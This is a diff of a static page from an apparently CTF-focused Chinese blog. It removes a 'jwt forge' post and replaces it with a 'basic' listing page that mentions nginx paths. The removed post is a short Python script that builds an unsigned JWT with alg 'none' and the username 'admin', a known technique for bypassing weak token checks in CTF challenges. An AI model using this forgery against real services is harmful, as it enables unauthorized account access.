@@ -3,7 +3,7 @@
   <head>
      
     <meta charset="UTF-8">
-    <title>jwt forge - d0ud</title>
+    <title>basic - d0ud</title>
     <link rel="shortcut icon" href="/static/img/icon.png">
     <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
     
@@ -15,7 +15,7 @@
 
     <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
     <meta property="og:site_name" content="d0ud">
-    <meta property="og:title" content="jwt forge"/>
+    <meta property="og:title" content=""/>
     
     <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/img/bgg.png) }</style>
     
@@ -51,60 +51,38 @@
 
     <main>
     <div class="wrap min">
-        <section class="post-title">
-            <h2>jwt forge</h2>
-            <div class="post-meta">
-                <time class="date">2022.04.13</time>
+        <section class="home-title">
             
-                <span class="category"><a class="category-link" href="/categories/authentication/">authentication</a></span>
+            <h1>“basic”</h1>
+        </section>
+        <section class="home-posts">
+    
+    <div class="post-item">
+        <h2>
+            <a href="/basic_web_directory/">web directory</a>
+        </h2>
+    
+        <p>nginx网站目录
+配置文件存放目录：&amp;#x2F;etc&amp;#x2F;nginx
+主配置文件：&amp;#x2F;etc&amp;#x2F;nginx&amp;#x2F;conf&amp;#x2F;nginx.conf
+管理脚本...</p>
+    
+        <div class="post-meta">
+            <time class="date">1970.01.01</time>
             
-            </div>
-        </section>
-        <article class="post-content">
-        
-            <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-a <span class="token operator">=</span> <span class="token string">'&#123;"alg":"none","typ":"JWT"&#125;'</span>
-b<span class="token operator">=</span> <span class="token string">'&#123;"secretid":[],"username":"admin","password":"a","iat":1649828192&#125;'</span>
-
-c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-c <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">try</span><span class="token punctuation">:</span>
-    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-        c<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
-<span class="token keyword">except</span><span class="token punctuation">:</span>
-    <span class="token keyword">pass</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-        </article>
-        <section class="post-near">
-            <ul>
-                
-                    <li>上一篇: <a href="/%5BMRCTF2020%5DPYWebsite/">&lt;MRCTF2020&gt;PYWebsite</a></li>
-                
-                
-                    <li>下一篇: <a href="/%5BHFCTF2020%5DEasyLogin/">&lt;HFCTF2020&gt;EasyLogin</a></li>
-                
-            </ul>
-        </section>
-        
-            <section class="post-tags">
-            <a class="-none-link" href="/tags/script/" rel="tag">script</a>
-            </section>
-        
+                <span class="category"><a class="category-link" href="/categories/record/">record</a></span>
+            
+            
+                <span class="tags"><a class="-none-link" href="/tags/basic/" rel="tag">basic</a></span>
+            
+        </div>
+    </div>
     
-        <section class="post-author">
-        
-            <figure class="author-avatar">
-                <img src="https://null-d0ud.github.io/img/logo.jpg" alt="d0ud" />
-            </figure>
-        
-            <div class="author-info">
-                <h4>d0ud</h4>
-                <p>a ctfer</p>
-            </div>
+</section>
+
+        <section class="page-navigator">
+            <span class="page-number current">1</span>
         </section>
-    
     </div>
 </main>
 
